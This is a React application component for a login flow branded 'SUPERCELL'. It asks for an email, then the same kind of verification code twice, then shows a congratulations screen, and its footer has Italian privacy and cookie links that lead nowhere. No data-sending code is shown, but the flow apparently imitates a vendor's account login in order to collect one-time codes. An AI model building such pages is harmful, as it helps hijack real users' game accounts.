import React, { useState } from 'react';
import Login from './components/Login';
import VerifyCode from './components/VerifyCode';
import Congrats from './components/Congrats';
import ProgressBar from './components/ProgressBar';

const steps = [
  'Login',
  'Verify',
  'Verify Again',
  'Congrats',
];

export default function App() {
  const [step, setStep] = useState(0);
  const [email, setEmail] = useState('');
  const [code1, setCode1] = useState('');
  const [code2, setCode2] = useState('');

  return (
    <div className="app-bg">
      <div className="center-card">
        <ProgressBar step={step} total={steps.length - 1} />
        {step === 0 && (
          <Login
            onSubmit={e => {
              setEmail(e);
              setStep(1);
            }}
          />
        )}
        {step === 1 && (
          <VerifyCode
            email={email}
            onSubmit={c => {
              setCode1(c);
              setStep(2);
            }}
            stepLabel="Almost there!"
          />
        )}
        {step === 2 && (
          <VerifyCode
            email={email}
            onSubmit={c => {
              setCode2(c);
              setStep(3);
            }}
            stepLabel="One more step!"
          />
        )}
        {step === 3 && <Congrats email={email} />}
      </div>
      <div className="footer">
        <div>
          <select className="language-select" defaultValue="it">
            <option value="it">Italiano</option>
            <option value="en">English</option>
            <option value="es">Español</option>
            <option value="fr">Français</option>
            <option value="de">Deutsch</option>
          </select>
        </div>
        <div className="footer-links">
          <a href="#" style={{ color: '#fff' }}>Normativa sulla privacy</a>
          <a href="#" style={{ color: '#fff' }}>Condizioni d'Uso</a>
          <a href="#" style={{ color: '#fff' }}>Gestisci cookie</a>
        </div>
        <div className="footer-logo">SUPERCELL</div>
      </div>
    </div>
  );
}
